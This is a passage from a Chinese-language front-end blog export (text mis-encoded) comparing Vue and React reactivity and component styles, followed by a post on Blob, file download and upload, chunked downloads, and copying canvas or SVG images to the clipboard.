æ˜¾ç„¶æ¯”æ¸²æŸ“ html å­—ç¬¦ä¸²è¦æ…¢ï¼Œä½†æ˜¯ï¼å®ƒä¾ç„¶æ˜¯çº¯ js å±‚é¢çš„è®¡ç®—ï¼Œæ¯”èµ·åé¢çš„ DOM æ“ä½œæ¥è¯´ï¼Œä¾ç„¶ä¾¿å®œäº†å¤ªå¤šã€‚</p><p><br></p><p><em>ä»å®ç°å“åº”å¼æ–¹å¼æ¥çœ‹ï¼š</em></p><ul><li>ä¾èµ–æ”¶é›†æ˜¯Vueçš„ç‰¹ç‚¹ï¼ŒVueç”¨ <code>proxy</code> , <code>Object.defineProperty</code> å®ç°ä¾èµ–æ”¶é›†ï¼Œä¾èµ–è¿½è¸ªã€‚<br>ä¾èµ–æ”¶é›†æä¾›äº†ç‚¹å¯¹ç‚¹ç²’åº¦çš„æ›´æ–°è§¦å‘ï¼Œè€Œreactåªèƒ½ä»¥ç»„ä»¶ä¸ºç²’åº¦è§¦å‘diff</li><li><p>Reactæ²¡æœ‰ä¾èµ–æ”¶é›†ï¼Œè€Œæ˜¯åœ¨ <code>setState</code> åé€šè¿‡UI Treeä¸€å±‚ä¸€å±‚å¾€ä¸‹æ›´æ–°æ¸²æŸ“ã€‚</p><p>å½“å±‚çº§è¾ƒé«˜çš„ <code>state</code> å˜åŒ–æ—¶ï¼Œä¼šå¼•èµ·å¤§é‡ç»„ä»¶çš„æ›´æ–°ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒReact æå‡ºäº† Fiber æ¥å¤„ç†è®¡ç®—é‡å¤§çš„æƒ…å†µä¸‹ï¼Œæ²¡æœ‰äº¤äº’å“åº”é—´éš™çš„é—®é¢˜ã€‚åŒæ—¶æä¾›äº† <code>useMemo</code>, <code>useCallback</code> å…è®¸ä½ ç¼“å­˜ç»„ä»¶ï¼Œå‡å°‘ä¸å¿…è¦çš„æ¸²æŸ“ã€‚</p></li></ul><p><br></p><p><strong>4. render æ¸²æŸ“å†™æ³•ä¸åŒ</strong></p><p>  template å’Œ JSX éƒ½æ˜¯ render çš„ä¸€ç§è¡¨ç°å½¢å¼ã€‚</p><ul><li>React çš„ JSX èƒ½å®Œå…¨èåˆåˆ°JSä¸­ï¼Œå…·æœ‰æ›´é«˜çš„çµæ´»æ€§ï¼Œåœ¨å¤æ‚çš„ç»„ä»¶ä¸­ï¼Œæ›´å…·æœ‰ä¼˜åŠ¿ã€‚</li><li>template å…¶å®æ˜¯å¾€ä¸Šå°è£…äº†ä¸€å±‚ï¼Œç›¸åŒçš„é€»è¾‘ä»£ç é‡æ›´å°‘ï¼Œæ›´ç®€å•ç›´è§‚ã€æ›´å¥½ç»´æŠ¤ã€‚templateå¯ä»¥æä¾›æ›´å¥½çš„æ€§èƒ½ä¼˜åŒ–ï¼Œç”¨èµ·æ¥ä¹Ÿå¾ˆè´´åˆéœ€æ±‚ï¼Œä¸ä¼šè§‰å¾—ä¸å¤Ÿç”¨ã€‚</li></ul><p><br></p><p><strong>5. API æä¾›çš„åŠŸèƒ½ä¸åŒ</strong></p><ul><li>React Hooks å¯¥å¯¥å‡ ä¸ªAPIï¼ŒHooks + Effect å°±èƒ½æ»¡è¶³æ‰€æœ‰éœ€æ±‚ï¼Œçµæ´»å·§å¦™ï¼Œéœ€è¦ä½ ä¸€ç‚¹ç‚¹å»ç»„è£…ã€‚</li><li>Vue åˆ™æ˜¯æä¾›äº†å¤§é‡çš„ APIã€‚Options API æœ‰ä¸å°‘å¯å–ä¹‹å¤„ï¼Œdata, lifecycle, computed, methods, watch å¿…é¡»åˆ†é—¨åˆ«ç±»çš„æ”¾å¥½ã€‚é¿å…äº†æ–°æ‰‹å°†åŠŸèƒ½å’Œé€»è¾‘æ‘†çš„ä¹±ä¸ƒå…«ç³Ÿã€‚Vue2ä»¥å…¶æä½çš„å…¥é—¨é—¨æ§›å’Œæå…¶ç›´è§‚çš„è¯­æ³•ï¼Œå¸®åŠ©ä½ å®Œæˆé¡µé¢å¼€å‘ã€‚é™¤äº†è¿™äº›ï¼Œè¿˜æœ‰provide/inject, keep-alive, v-model, è¿™äº›APIæ˜¯å‹å¥½çš„ï¼Œé¢å¯¹æ›´å¤æ‚çš„åœºæ™¯ï¼Œå®ƒä»¬åƒä¸€ä¸ªä¸ªæœ€ä½³å®è·µï¼Œéœ€è¦ä½ ä¸€ä¸ªä¸ªå»ç†Ÿæ‚‰ã€‚</li></ul><p><br></p><p>å›å¿†ä¸€ä¸‹å®ƒä»¬éƒ½æ˜¯æ€ä¹ˆç”¨çš„ï¼Ÿ<br><br></p><h3 id="2-Vue2"><a href="#2-Vue2" class="headerlink" title="2. Vue2"></a>2. Vue2</h3><p>2016å¹´Vue2å‘å¸ƒã€‚</p><p>Vue2ä½¿ç”¨ <code>Options API</code> é…ç½®åŒ–çš„æ–¹å¼ç»„ç»‡ä»£ç ï¼Œæ­é…å„ç§APIã€æŒ‡ä»¤ï¼Œå¾ˆå®¹æ˜“æ»¡è¶³äº†å„ç§é¡µé¢éœ€æ±‚ï¼Œä¸Šæ‰‹å®¹æ˜“ï¼Œç®€å•å¥½ç”¨ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¯ä¸ª`.vue`æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªç»„ä»¶</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  data() &#123; </span><br><span class="line">    <span class="keyword">return</span> &#123; </span><br><span class="line">      count: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123; </span><br><span class="line">    increment() &#123; </span><br><span class="line">      <span class="keyword">this</span>.count++ </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-React-Class-Component"><a href="#3-React-Class-Component" class="headerlink" title="3. React(Class Component)"></a>3. React(Class Component)</h3><p>å’Œ Vue2 åŒæœŸçš„æ˜¯ React çš„ Class Componentã€‚</p><p>æ¯ä¸ª UI ç»„ä»¶æ—¢æ˜¯ <code>&lt;Component /&gt;</code> è¿™æ ·å¾ˆHTMLçš„å†™æ³•ï¼Œåˆæ˜¯ä¸€ä¸ªç±»çš„å®ä¾‹ã€‚</p><p>ç±»(class)è®©ç»„ä»¶çš„æ•°æ®å’Œæ“ä½œé€»è¾‘å°è£…åœ¨ä¸€èµ·ï¼Œæœ€åè¿”å›äº†JSXï¼Œåˆè¡¨è¾¾äº†è¿™æ˜¯ä¸€ä¸ªUIç»„ä»¶ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123; <span class="attr">name</span> : <span class="string">''</span> &#125;</span><br><span class="line">  </span><br><span class="line">  componentDidUpdate() &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123; <span class="attr">name</span>: <span class="string">'hh'</span>&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;this.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-React16-Function-Component-Hooks"><a href="#3-React16-Function-Component-Hooks" class="headerlink" title="3. React16 (Function Component + Hooks)"></a>3. React16 (Function Component + Hooks)</h3><p>2019å¹´ React æ¨å‡º Hooks å†™æ³•ã€‚</p><p><br></p><h4 id="3-1-å‡½æ•°ç»„ä»¶"><a href="#3-1-å‡½æ•°ç»„ä»¶" class="headerlink" title="3.1 å‡½æ•°ç»„ä»¶"></a>3.1 å‡½æ•°ç»„ä»¶</h4><p>React å¸Œæœ›ï¼Œç»„ä»¶ä¸è¦å˜æˆå¤æ‚çš„å®¹å™¨ã€‚</p><p>React çš„å‡½æ•°ç»„ä»¶åªåº”è¯¥åšä¸€ä»¶äº‹æƒ…ï¼šè¿”å›ç»„ä»¶çš„ HTML ä»£ç ï¼Œè€Œæ²¡æœ‰å…¶ä»–çš„åŠŸèƒ½ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Welcome</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œè¿™ç§å†™æ³•æœ‰å¾ˆå¤§çš„é™åˆ¶ï¼Œçº¯å‡½æ•°æ— æ³•åŒ…å«çŠ¶æ€ï¼Œä¹Ÿä¸æ”¯æŒç”Ÿå‘½å‘¨æœŸæ–¹æ³•ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒReactå¼•å…¥Hooksï¼Œå¸Œæœ›ä¸ä½¿ç”¨â€ç±»â€ï¼Œä¹Ÿèƒ½å†™å‡ºä¸€ä¸ªå…¨åŠŸèƒ½çš„ç»„ä»¶ã€‚</p><p><br></p><h4 id="3-2-Hooks"><a href="#3-2-Hooks" class="headerlink" title="3.2 Hooks"></a>3.2 Hooks</h4><p><em><code>Hooks</code></em> æ˜¯é’©å­çš„æ„æ€ï¼Œç»„ä»¶è¿˜æ˜¯è¦å†™æˆçº¯å‡½æ•°ï¼Œå¦‚æœè¦å…¶ä»–åŠŸèƒ½ï¼Œå°±è¦ç”¨é’©å­æŠŠå®ƒä»¬â€é’©â€è¿›æ¥ã€‚</p><p>å¸¸è§çš„é’©å­æœ‰ï¼š</p><ul><li><code>useState</code>ï¼šä¸ºå‡½æ•°ç»„ä»¶å¼•å…¥çŠ¶æ€state</li><li><code>useEffect</code>ï¼šå¼•å…¥å…·æœ‰å‰¯ä½œç”¨çš„æ“ä½œï¼Œå¦‚è·å–æ•°æ®ã€äº‹ä»¶ç›‘å¬ã€æ”¹å˜DOM<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Counter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> increment = <span class="function"><span class="params">()</span> =&gt;</span> setCount(<span class="function"><span class="params">c</span> =&gt;</span> c + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;increment&#125;</span>&gt;</span>&#123;count&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>ä½ è¿˜å¯ä»¥åˆ›å»ºè‡ªå·±çš„Hooksã€‚</p><p>Hooksçš„å†™æ³•å°†æ•°æ®ã€é€»è¾‘ä»classä¸­åˆ†ç¦»å‡ºæ¥ï¼Œå¼€å¯äº†ç»„ä»¶é€»è¾‘è¡¨è¾¾å’Œé€»è¾‘å¤ç”¨çš„æ–°èŒƒå¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> usePerson = <span class="function">(<span class="params">personId</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [loading, setLoading] = useState(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">const</span> [person, setPerson] = useState(&#123;&#125;);</span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    setLoading(<span class="literal">true</span>);</span><br><span class="line">    fetch(<span class="string">`https://swapi.co/api/people/<span class="subst">$&#123;personId&#125;</span>/`</span>)</span><br><span class="line">      .then(<span class="function"><span class="params">response</span> =&gt;</span> response.json())</span><br><span class="line">      .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        setPerson(data);</span><br><span class="line">        setLoading(<span class="literal">false</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;, [personId]);  </span><br><span class="line">  <span class="keyword">return</span> [loading, person];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-Vue3-Compsition-API"><a href="#4-Vue3-Compsition-API" class="headerlink" title="4. Vue3 Compsition API"></a>4. Vue3 Compsition API</h3><p>å—åˆ° React hooks çš„å¯å‘ï¼ŒVue3 æä¾›äº†ç±»ä¼¼çš„ Composition APIã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    <span class="keyword">const</span> count = ref(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">const</span> increment = <span class="function"><span class="params">()</span> =&gt;</span> count.value++;</span><br><span class="line">    <span class="keyword">return</span> &#123; count, increment &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><p>End.</p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://vue3js.cn/vue-composition/" target="_blank" rel="noopener">Vue ç»„åˆå¼ API</a></li><li><a href="https://www.ruanyifeng.com/blog/2020/09/react-hooks-useeffect-tutorial.html" target="_blank" rel="noopener">é˜®ä¸€å³°ï¼šè½»æ¾å­¦ä¼š React é’©å­ï¼šä»¥ useEffect() ä¸ºä¾‹</a></li><li><a href="https://www.zhihu.com/question/309891718/answer/3073163101" target="_blank" rel="noopener">è°èƒ½å¤§è‡´è¯´ä¸‹vueå’Œreactçš„æœ€å¤§åŒºåˆ«ä¹‹å¤„ï¼Ÿ</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Blob, toBlob, FileReader æ–‡ä»¶æ“ä½œ &amp; å¤åˆ¶</title>
      <link href="/2024/08/16/copy/"/>
      <url>/2024/08/16/copy/</url>
      <content type="html"><![CDATA[<h3 id="1-Blob"><a href="#1-Blob" class="headerlink" title="1. Blob"></a>1. Blob</h3><p>Blobè¡¨ç¤ºä¸å¯å˜çš„åŸå§‹æ•°æ®ï¼Œå¯ä»¥æ˜¯äºŒè¿›åˆ¶æ•°æ®æˆ–æ–‡æœ¬æ•°æ®ã€‚</p><h4 id="1-1-ä¸‹è½½æ–‡ä»¶"><a href="#1-1-ä¸‹è½½æ–‡ä»¶" class="headerlink" title="1.1 ä¸‹è½½æ–‡ä»¶"></a>1.1 ä¸‹è½½æ–‡ä»¶</h4><p><em><code>new Blob()</code></em>åˆ›å»ºä¸€ä¸ªBlobå¯¹è±¡å¯ä»¥æ–¹ä¾¿åœ°å°†æ•°æ®è½¬æ¢ä¸ºæ–‡ä»¶å½¢å¼ï¼Œå¹¶é€šè¿‡<em><code>URL.createObjectURL</code></em>ç”Ÿæˆä¸´æ—¶URLç”¨äºä¸‹è½½æˆ–æ˜¾ç¤ºã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'downloadBtn'</span>).addEventListener(<span class="string">'click'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> content = <span class="string">'è¿™æ˜¯ä¸€ä¸ªé€šè¿‡Blobåˆ›å»ºçš„æ–‡æœ¬æ–‡ä»¶ã€‚'</span>;</span><br><span class="line">  <span class="keyword">const</span> blob = <span class="keyword">new</span> Blob([content], &#123; <span class="attr">type</span>: <span class="string">'text/plain;charset=utf-8'</span> &#125;);</span><br><span class="line">  <span class="keyword">const</span> url = URL.createObjectURL(blob);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">  a.href = url;</span><br><span class="line">  a.download = <span class="string">'example.txt'</span>;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">  a.click();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// é‡Šæ”¾URLå¯¹è±¡</span></span><br><span class="line">  URL.revokeObjectURL(url);</span><br><span class="line">  <span class="built_in">document</span>.body.removeChild(a);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-ä¸Šä¼ æ–‡ä»¶"><a href="#1-2-ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="1.2 ä¸Šä¼ æ–‡ä»¶"></a>1.2 ä¸Šä¼ æ–‡ä»¶</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'uploadBtn'</span>).addEventListener(<span class="string">'click'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> fileInput = <span class="built_in">document</span>.getElementById(<span class="string">'fileInput'</span>);</span><br><span class="line">  <span class="keyword">const</span> file = fileInput.files[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!file) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åˆ›å»ºFormDataå¯¹è±¡, ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">  <span class="keyword">const</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line">  formData.append(<span class="string">'image'</span>, file);</span><br><span class="line">  fetch(<span class="string">'https://example.com/upload'</span>, &#123;</span><br><span class="line">    method: <span class="string">'POST'</span>,</span><br><span class="line">    body: formData,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-3-å¤§æ–‡ä»¶çš„åˆ†æ®µä¸‹è½½"><a href="#1-3-å¤§æ–‡ä»¶çš„åˆ†æ®µä¸‹è½½" class="headerlink" title="1.3 å¤§æ–‡ä»¶çš„åˆ†æ®µä¸‹è½½"></a>1.3 å¤§æ–‡ä»¶çš„åˆ†æ®µä¸‹è½½</h4><p>å¤§æ–‡ä»¶åˆ†æ®µä¸‹è½½ï¼Œè·Ÿå¤§æ–‡ä»¶ä¸Šä¼ æ—¶è¦åˆ‡ç‰‡çš„åˆå¿ƒä¸€æ ·ï¼Œæ˜¯ä¸ºäº†â€œå¿«â€ã€‚åˆ©ç”¨ HTTP è¯·æ±‚å¤´ <em><code>Range</code></em>æ§åˆ¶ä¸‹è½½ç‰‡æ®µï¼Œèƒ½å¤ŸåŒæ—¶ä¸‹è½½ä¸€ä¸ªå¤§æ–‡ä»¶çš„å¤šä¸ªç‰‡æ®µï¼Œç„¶åç»„è£…èµ·æ¥ï¼Œé‚£å°†èƒ½å¤Ÿå……åˆ†åˆ©ç”¨æˆ‘ä»¬çš„ç½‘ç»œèµ„æºï¼ŒåŠ é€Ÿä¸‹è½½ã€‚<br>ps: å®ç°<em>æš‚åœä¸‹è½½</em>ï¼Œåˆ™æ˜¯å–æ¶ˆæ‰€æœ‰æœªå®Œæˆçš„è¯·æ±‚ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¹¶å‘åˆ†æ®µä¸‹è½½</span></span><br><span class="line">axios.get(linkUrl, &#123;</span><br><span class="line">  headers: &#123;</span><br><span class="line">    Range: <span class="string">`bytes=<span class="subst">$&#123;start&#125;</span>-<span class="subst">$&#123;end&#125;</span>`</span>,</span><br><span class="line">    responseType: <span class="string">'blob'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå¹¶åˆ†æ®µ</span></span><br><span class="line"><span class="keyword">const</span> blobs = <span class="keyword">await</span> <span class="built_in">Promise</span>.all(tasks)</span><br><span class="line"><span class="keyword">const</span> blob = <span class="keyword">new</span> Blob(</span><br><span class="line">  blobs.map(<span class="function"><span class="params">blob</span> =&gt;</span> blob.data),</span><br><span class="line">  &#123; <span class="attr">type</span>: mime &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿å­˜ä¸ºæ–‡ä»¶ï¼Œè§1.1 ä¸‹è½½æ–‡ä»¶</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-toBlob"><a href="#2-toBlob" class="headerlink" title="2. toBlob"></a>2. toBlob</h3><p><code>HTMLCanvasElement.toBlob(callback, type, quality)</code> æ–¹æ³•åˆ›é€  Blob å¯¹è±¡ï¼Œç”¨ä»¥å±•ç¤º canvas ä¸Šçš„å›¾ç‰‡ï¼›è¿™ä¸ªå›¾ç‰‡æ–‡ä»¶å¯ä»¥è¢«ç¼“å­˜æˆ–ä¿å­˜åˆ°æœ¬åœ°ã€‚</p><ul><li><code>callback</code>: å›è°ƒå‡½æ•°ï¼Œå¯è·å¾—ä¸€ä¸ªå•ç‹¬çš„ Blob å¯¹è±¡å‚æ•°</li><li><code>type</code>: string, æŒ‡å®šå›¾ç‰‡æ ¼å¼ï¼Œé»˜è®¤ä¸º image/pngã€‚<ul><li>text/plain - çº¯æ–‡æœ¬æ–‡æ¡£</li><li>text/html - htmlæ–‡æ¡£</li><li>text/javascript - jsæ–‡ä»¶</li><li>text/css - cssæ–‡ä»¶</li><li>application/json - jsonæ–‡ä»¶</li><li>application/pdf - pdfæ–‡ä»¶</li><li>application/xml - xmlæ–‡ä»¶</li><li>image/jpeg - jpegå›¾åƒ</li><li>image/png - pngå›¾åƒ</li><li>image/gif - gifå›¾åƒ</li><li>image/svg+xml - svgå›¾åƒ</li><li>audio/mpeg - mp3æ–‡ä»¶</li><li>video/mpeg - mp4æ–‡ä»¶</li></ul></li><li><code>quality</code>: Number ç±»å‹ï¼Œå€¼åœ¨ 0 ä¸ 1 ä¹‹é—´ï¼Œå½“è¯·æ±‚å›¾ç‰‡æ ¼å¼ä¸º image/jpeg æˆ–è€… image/webp æ—¶ç”¨æ¥æŒ‡å®šå›¾ç‰‡å±•ç¤ºè´¨é‡ã€‚</li><li><em><code>canvasHTMLElement.toBlob</code></em>å¯ä»¥ç”¨æ¥å®ç°å¤åˆ¶æ•ˆæœ<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copyBlob</span>(<span class="params">blob: Blob | null</span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!blob) <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">if</span> (!navigator.clipboard || !navigator.clipboard.write) <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">const</span> data = [<span class="keyword">new</span> ClipboardItem(&#123; [blob.type]: blob &#125;)]</span><br><span class="line">  navigator.clipboard.write(data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-1-å¤åˆ¶-canvas-svg-ä¸ºå›¾ç‰‡"><a href="#2-1-å¤åˆ¶-canvas-svg-ä¸ºå›¾ç‰‡" class="headerlink" title="2.1 å¤åˆ¶ canvas / svg ä¸ºå›¾ç‰‡"></a>2.1 å¤åˆ¶ canvas / svg ä¸ºå›¾ç‰‡</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getChartBlob</span>(<span class="params">title: string | null</span>): <span class="title">Promise</span>&lt;<span class="title">Blob</span> | <span class="title">null</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> chartDiv = <span class="built_in">document</span>.getElementById(<span class="string">`chart-container`</span>) <span class="keyword">as</span> HTMLElement</span><br><span class="line">    <span class="keyword">const</span> svgElement = chartDiv.querySelector(<span class="string">'svg'</span>) <span class="keyword">as</span> SVGElement</span><br><span class="line">    <span class="keyword">const</span> svgXML = <span class="keyword">new</span> XMLSerializer().serializeToString(svgElement)</span><br><span class="line">    <span class="keyword">const</span> chartWidth = svgElement.clientWidth * <span class="number">1.5</span></span><br><span class="line">    <span class="keyword">const</span> chartHeight = svgElement.clientHeight * <span class="number">1.5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„canvaså…ƒç´ </span></span><br><span class="line">    <span class="keyword">const</span> canvas = <span class="built_in">document</span>.createElement(<span class="string">'canvas'</span>) <span class="keyword">as</span> HTMLCanvasElement</span><br><span class="line">    <span class="keyword">const</span> context = canvas.getContext(<span class="string">'2d'</span>) <span class="keyword">as</span> CanvasRenderingContext2D</span><br><span class="line">    canvas.width = chartWidth + <span class="number">32</span></span><br><span class="line">    canvas.height = title</span><br><span class="line">      ? chartHeight + <span class="number">66</span> <span class="comment">// å›¾è¡¨æ ‡é¢˜å 34px</span></span><br><span class="line">      : chartHeight + <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„Imageå¯¹è±¡</span></span><br><span class="line">    <span class="keyword">const</span> image = <span class="keyword">new</span> Image()</span><br><span class="line">    image.src = <span class="string">'data:image/svg+xml;charset=utf8,'</span> + <span class="built_in">encodeURIComponent</span>(svgXML)</span><br><span class="line">    image.onload = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      context.fillStyle = <span class="string">'#fff'</span></span><br><span class="line">      context.fillRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height)</span><br><span class="line">      <span 